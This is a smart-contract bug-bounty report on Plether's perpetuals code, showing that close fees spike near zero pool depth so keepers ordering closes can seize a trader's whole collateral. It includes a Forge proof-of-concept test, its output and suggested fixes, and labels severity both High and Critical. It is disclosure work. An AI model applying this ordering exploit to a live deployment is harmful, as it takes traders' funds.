# \#99208 [SC-High] Close VPI is waived only at exactly zero net depth, so just above zero an ordinary close takes the trader's whole collateral, and the order of closes decides who loses it

**Submitted on Nov 12th 2026 at 12:17:44 UTC by @Tradi3 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99208
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Close VPI is `k × (post² − pre²) / (2 × D)`, where `D` is pool assets net of trader claims. The code waives it only when `D` is exactly zero (`CloseAccountingLib.sol:105-111`, "keep protective exits live"). Just above zero, the charge on a skew-increasing close grows as `1/D`, and the only cap is the closing trader's collateral.

In the documented terminal-deficit runbook ("Let closes and liquidations continue", SECURITY.md:1505), `D` moves from below zero to above zero as losers close or are liquidated. So whether a trader's close is free or takes their whole equity depends only on which other close or liquidation executes first. Keepers are untrusted and choose the execution order.

Measured at release parameters on Forge 1.5.1, with all trading through router commit and keeper execute, from one snapshot that varies only the order of two ordinary closes:
- FRANK (10,000-token LONG) closes before DAVE: FRANK takes out 2,988.999998 USDG.
- FRANK closes after DAVE: FRANK takes out 0 USDG.

The pool keeps the difference, 2,988.999989 USDG, which is FRANK's whole remaining equity.

**Target:** `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`: `packages/perps/src/libraries/CloseAccountingLib.sol`, `packages/perps/src/libraries/PositionRiskAccountingLib.sol`, `packages/perps/src/CfdMath.sol`

## Vulnerability Details

The close planner computes depth as assets net of claims, floored at zero (`PositionRiskAccountingLib.sol:21-26`):

```solidity
return physicalAssets > traderClaimsAssets ? physicalAssets - traderClaimsAssets : 0;
```

The close accounting then charges fresh VPI for any non-zero depth (`CloseAccountingLib.sol:105-111`):

```solidity
// With no economic depth, keep protective exits live without creating a fresh charge or rebate.
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
```

`CfdMath.calculateVPI` divides the skew cost by depth. So the waiver covers `D == 0` (including every negative `D`, floored to 0), but at `D = 1` atom the same close is charged the full `1/D` amount. Nothing bounds the charge except the trader's reachable collateral, so a close that would cost nothing at `D ≤ 0` costs the whole equity at any small positive `D`.

`D` crosses zero in ordinary operation during a deficit. In the runbook state, trader claims exceed pool cash (`D < 0`). Every loser's close or liquidation pays its loss into the pool and raises `D`. The first loss that lifts `D` just above zero makes the next skew-increasing close confiscatory. Opens are blocked in degraded mode, but closes and liquidations are not, and the runbook tells operators to let them continue.

Who decides the order:
- **Keepers.** Execution of committed orders and liquidations is permissionless. A keeper can call `executeLiquidation` on a liquidatable loser, or execute a loser's queued close, immediately before executing the victim's close. The victim's committed order cannot be cancelled.
- **The owner's documented recovery.** `recapitalizePool` in tranches moves `D` through the same small positive range. `test_FrankOutVersusDepth` shows the victim's payout at each depth.

The profit goes to the pool, so to the LPs, and to the claim holders, whose claims are covered sooner.

## Impact Details

A trader with an open position in a deficit market can lose their entire collateral through an ordinary close. The loss depends only on whether another close or liquidation executes first, and the gain goes to the pool. Measured at release parameters (vpiFactor 0.01e18, maxSkewRatio 0.4e18, execution fee 4 bps):

| Arm (same snapshot) | D when FRANK closes | FRANK USDG out | DAVE USDG out | Pool assets after both closes |
|---|---|---|---|---|
| A: DAVE closes, then FRANK | +2,225.548282 | 0 | 1,489.866715 | 138,075.483204 |
| B: FRANK closes, then DAVE | −11,774.451741 | 2,988.999998 | 1,489.866706 | 135,086.483215 |

DAVE's result is the same in both arms (to 0.00001 USDG of carry). The only thing the order changes is FRANK's payout, and the pool keeps it.

FRANK's payout as a function of `D` (after DAVE's close, `D` set by an owner recapitalisation, `test_FrankOutVersusDepth`):

| D when FRANK closes (USDG) | FRANK USDG out |
|---|---|
| 2,225.55 | 0 |
| 3,225.55 | 751.15 |
| 5,225.55 | 1,608.45 |
| 10,225.55 | 2,284.52 |
| 20,225.55 | 2,633.86 |
| 100,225.55 | 2,919.00 |
| ≤ 0 (arm B) | 2,989.00 |

The charge is about `7.2e6 / D` USDG for this position: about 3,245 USDG at D = 2,225.55, which is 19% of FRANK's 17,000 USDG close notional and more than his 2,989 USDG of equity. Nothing caps the charge at the notional or the equity; only the reachable collateral limits what is collected. The whole equity is taken below about 2,400 USDG of depth, and a large share well above that.

Severity: Critical, "Direct theft of any user funds". A keeper, or any party that controls the order of a liquidation or a loser's close relative to a queued victim close, moves the victim's remaining collateral into the pool. The victim cannot cancel the committed close.

## Recommendation

Make the close charge continuous at zero depth. For example:
- floor the depth used for close VPI at a minimum (such as the skew-cap depth implied by the position, or the pre-deficit depth);
- or cap fresh close VPI at a fraction of the closed notional;
- or waive fresh close VPI whenever degraded mode is latched, not only when `D == 0`.

## References

- `packages/perps/src/libraries/CloseAccountingLib.sol:105-111`: fresh VPI waived only when depth == 0
- `packages/perps/src/libraries/PositionRiskAccountingLib.sol:21-26`: depth = assets − claims, floored at 0
- `packages/perps/src/CfdMath.sol:150-180`: VPI = skew cost / depth
- `packages/perps/SECURITY.md:1439-1440`: "Protective closes create no fresh VPI charge or rebate at zero depth"
- `packages/perps/SECURITY.md:1501-1509`: terminal-deficit runbook, "Let closes and liquidations continue", "Recapitalize or clear positions"

## Proof of Concept

## Steps

1. Clone `immunefi-team/audit-comp-plether` at `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.
2. Save the file below as `packages/perps/test/perps/ly5/NearZeroDepthClosePole.t.sol` (it imports the repository's own `../shared/HousePoolTestBase.sol`).
3. Run with Forge 1.5.1 from the repository root:

```bash
forge test --root packages/perps --match-path test/perps/ly5/NearZeroDepthClosePole.t.sol -vv
```

What the test does:
1. A 240,000 USDG pool (Junior 140k, Senior 100k, release Senior cap and share). Balanced LONG and SHORT books are opened at 1.00 through `router.commitOrder` and keeper `executeOrder`.
2. A round trip 1.00 -> 0.30 -> 1.70: BOB's LONG closes at 0.30 and is paid in full (degraded mode latches), CAROL's SHORT closes at 1.70 and her payout is left as an unfunded trader claim. Net depth D = -11,774.45 USDG.
3. From one snapshot, arm A executes DAVE's losing close and then FRANK's close; arm B executes FRANK's close and then DAVE's. Nothing else differs.
4. `test_FrankOutVersusDepth` sets D after DAVE's close with the owner's documented `recapitalizePool` and records FRANK's payout at each depth.

## Test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";

/// @notice Close VPI is k * (post^2 - pre^2) / (2 * D), with D = pool assets net of trader claims.
///         CloseAccountingLib.sol:105-111 waives it only when D == 0 ("keep protective exits live"), so just above
///         zero the charge grows as 1/D and is capped only by the closing trader's collateral.
///         One snapshot, two arms, nothing varied except the order of two ordinary closes:
///           A: DAVE closes first (his realised loss lifts D from below zero to just above it), then FRANK closes.
///           B: FRANK closes first (D <= 0, no VPI), then DAVE closes.
///         All trading goes through router commit + keeper execute. Release RiskParams; only Pyth and USDG are mocks.
contract NearZeroDepthClosePoleTest is HousePoolAsyncTestBase {
    address private constant JUNIOR_LP = address(0x93A1);
    address private constant SENIOR_LP = address(0x93A2);
    address private constant BOB = address(0x93B0);
    address private constant CAROL = address(0x93C0);
    address private constant DAVE = address(0x93D0);
    address private constant FRANK = address(0x93F0);
    address private constant GRACE = address(0x93E0);
    address private constant KEEPER = address(0x93EE);

    function _initialJuniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialSeniorDeposit() internal pure override returns (uint256) { return 0; }
    function _initialJuniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }
    function _initialSeniorSeedDeposit() internal pure override returns (uint256) { return 1e6; }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        assertEq(engine.executionFeeBps(), 4);
    }

    uint256 private t;

    function _exec(address trader, CfdTypes.Side side, uint256 size, uint256 margin, uint256 price, bool isClose)
        internal
        returns (OrderV3Types.ExecutionResult memory result)
    {
        vm.prank(trader);
        uint64 orderId = router.commitOrder(side, size, margin, price, isClose);
        t += 1;
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(uint64(price)), 0, -8, t, t - 1);
        bytes[] memory updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
        uint256 fee = pletherOracle.getOrderExecutionFee(updateData);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        result = router.executeOrder{value: fee}(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _refresh(uint256 price) internal {
        t += 1;
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
        baseMockPyth.setAllPrices(_basePythFeedIds(), int64(uint64(price)), -8, t);
        bytes[] memory updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
        uint256 fee = pletherOracle.getUpdateFee(updateData);
        vm.deal(KEEPER, fee);
        vm.prank(KEEPER);
        router.updateMarkPrice{value: fee}(updateData);
    }

    function _depth() internal view returns (int256) {
        return int256(pool.totalAssets()) - int256(engine.totalTraderClaimBalanceAssets());
    }

    function _value(address a) internal view returns (uint256) {
        return settlementToken.balanceOf(a) + clearinghouse.balanceAssets(a) + engine.traderClaimBalanceAssets(a);
    }

    /// Pool of 240,000 USDG (Junior 140k, Senior 100k). Balanced books at 1.00. A round trip 1.00 -> 0.30 -> 1.70 pays
    /// BOB's LONG in full and leaves CAROL's SHORT payout as an unfunded trader claim: degraded mode, D < 0.
    function _world() internal {
        _fundJunior(JUNIOR_LP, 140_000e6);
        _fundSenior(SENIOR_LP, 100_000e6);
        t = block.timestamp + seniorVault.DEPOSIT_COOLDOWN() + 1;
        vm.warp(t);

        _fundTrader(BOB, 50_000e6);
        _fundTrader(CAROL, 200_000e6);
        _fundTrader(DAVE, 15_520e6);
        _fundTrader(FRANK, 10_000e6);
        _fundTrader(GRACE, 40_000e6);
        _refresh(1e8);
        _exec(BOB, CfdTypes.Side.LONG, 75_000e18, 20_000e6, 1e8, false);
        _exec(CAROL, CfdTypes.Side.SHORT, 150_000e18, 155_000e6, 1e8, false);
        _exec(BOB, CfdTypes.Side.LONG, 105_000e18, 25_000e6, 1e8, false);
        _exec(CAROL, CfdTypes.Side.SHORT, 30_000e18, 35_000e6, 1e8, false);
        _exec(DAVE, CfdTypes.Side.LONG, 20_000e18, 14_520e6, 1e8, false);
        _exec(GRACE, CfdTypes.Side.SHORT, 30_000e18, 30_000e6, 1e8, false);
        _exec(FRANK, CfdTypes.Side.LONG, 10_000e18, 9_000e6, 1e8, false);

        _exec(BOB, CfdTypes.Side.LONG, 180_000e18, 0, 0.30e8, true);
        assertTrue(engine.degradedMode(), "BOB's paid close latches degraded mode");
        _exec(CAROL, CfdTypes.Side.SHORT, 180_000e18, 0, 1.70e8, true);
        assertGt(engine.traderClaimBalanceAssets(CAROL), 0, "CAROL holds an unfunded claim");
        assertLt(_depth(), 0, "net depth below zero");
    }

    struct Arm {
        int256 depthAtFrank;
        uint256 frankOut;
        uint256 daveOut;
        uint256 poolEnd;
        uint256 claimsEnd;
    }

    function _arm(bool daveFirst) internal returns (Arm memory a) {
        if (daveFirst) {
            _exec(DAVE, CfdTypes.Side.LONG, 20_000e18, 0, 1.70e8, true);
            a.depthAtFrank = _depth();
            _exec(FRANK, CfdTypes.Side.LONG, 10_000e18, 0, 1.70e8, true);
        } else {
            a.depthAtFrank = _depth();
            _exec(FRANK, CfdTypes.Side.LONG, 10_000e18, 0, 1.70e8, true);
            _exec(DAVE, CfdTypes.Side.LONG, 20_000e18, 0, 1.70e8, true);
        }
        // Everything each trader holds after both closes (positions are flat, so this is withdrawable USDG).
        a.frankOut = _value(FRANK);
        a.daveOut = _value(DAVE);
        a.poolEnd = pool.totalAssets();
        a.claimsEnd = engine.totalTraderClaimBalanceAssets();
    }

    function test_CloseOrderDecidesWhetherFrankKeepsHisEquity() public {
        _world();
        emit log_named_int("net depth D before the two closes", _depth());
        uint256 snap = vm.snapshotState();
        Arm memory a = _arm(true);
        assertTrue(vm.revertToState(snap));
        Arm memory b = _arm(false);

        emit log_named_int("A: D when FRANK closes (DAVE closed first)", a.depthAtFrank);
        emit log_named_uint("A: FRANK USDG held after (flat)", a.frankOut);
        emit log_named_uint("A: DAVE USDG held after (flat)", a.daveOut);
        emit log_named_uint("A: pool assets after both closes", a.poolEnd);
        emit log_named_int("B: D when FRANK closes (FRANK first)", b.depthAtFrank);
        emit log_named_uint("B: FRANK USDG held after (flat)", b.frankOut);
        emit log_named_uint("B: DAVE USDG held after (flat)", b.daveOut);
        emit log_named_uint("B: pool assets after both closes", b.poolEnd);
        emit log_named_uint("FRANK loses (B - A)", b.frankOut - a.frankOut);
        emit log_named_uint("pool gains (A - B)", a.poolEnd - b.poolEnd);

        assertGt(a.depthAtFrank, 0, "A: FRANK closes at a small positive depth");
        assertLe(b.depthAtFrank, 0, "B: FRANK closes at depth <= 0, VPI waived");
        assertGt(b.frankOut, 2_000e6, "B: FRANK takes out his remaining equity");
        assertLt(a.frankOut, b.frankOut / 10, "A: the close charge takes (almost) all of FRANK's equity");
        assertApproxEqAbs(a.daveOut, b.daveOut, 1_000, "DAVE is unaffected by the order (within 0.001 USDG of carry)");
        assertGt(a.poolEnd, b.poolEnd, "the pool keeps FRANK's equity");
    }

    /// The charge scales as 1/D: from the state after DAVE's close, a documented owner recapitalisation of x USDG sets D,
    /// then FRANK closes. FRANK's equity is confiscated whole below a few thousand USDG of net depth.
    function test_FrankOutVersusDepth() public {
        _world();
        _exec(DAVE, CfdTypes.Side.LONG, 20_000e18, 0, 1.70e8, true);
        uint256 snap = vm.snapshotState();
        uint256[6] memory adds = [uint256(0), 1_000e6, 3_000e6, 8_000e6, 18_000e6, 98_000e6];
        for (uint256 i; i < adds.length; ++i) {
            assertTrue(vm.revertToState(snap));
            if (adds[i] > 0) {
                settlementToken.mint(address(this), adds[i]);
                settlementToken.approve(address(engine), adds[i]);
                engine.recapitalizePool(adds[i]);
            }
            int256 d = _depth();
            _exec(FRANK, CfdTypes.Side.LONG, 10_000e18, 0, 1.70e8, true);
            emit log_named_int("D (USDG atoms)", d);
            emit log_named_uint("  FRANK USDG out", _value(FRANK));
        }
    }
}
```

## Output (Forge 1.5.1, run at the pin)

```text
Ran 2 tests for test/perps/ly5/NearZeroDepthClosePole.t.sol:NearZeroDepthClosePoleTest
[PASS] test_CloseOrderDecidesWhetherFrankKeepsHisEquity() (gas: 25053500)
Logs:
  net depth D before the two closes: -11774451741
  A: D when FRANK closes (DAVE closed first): 2225548282
  A: FRANK USDG held after (flat): 0
  A: DAVE USDG held after (flat): 1489866715
  A: pool assets after both closes: 138075483204
  B: D when FRANK closes (FRANK first): -11774451741
  B: FRANK USDG held after (flat): 2988999998
  B: DAVE USDG held after (flat): 1489866706
  B: pool assets after both closes: 135086483215
  FRANK loses (B - A): 2988999998
  pool gains (A - B): 2988999989
[PASS] test_FrankOutVersusDepth() (gas: 29771812)
Logs:
  D (USDG atoms): 2225548282
    FRANK USDG out: 0
  D (USDG atoms): 3225548282
    FRANK USDG out: 751154029
  D (USDG atoms): 5225548282
    FRANK USDG out: 1608453261
  D (USDG atoms): 10225548282
    FRANK USDG out: 2284519715
  D (USDG atoms): 20225548282
    FRANK USDG out: 2633861829
  D (USDG atoms): 100225548282
    FRANK USDG out: 2918995887
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 63.69ms (102.64ms CPU time)
Ran 1 test suite in 65.42ms (63.69ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```
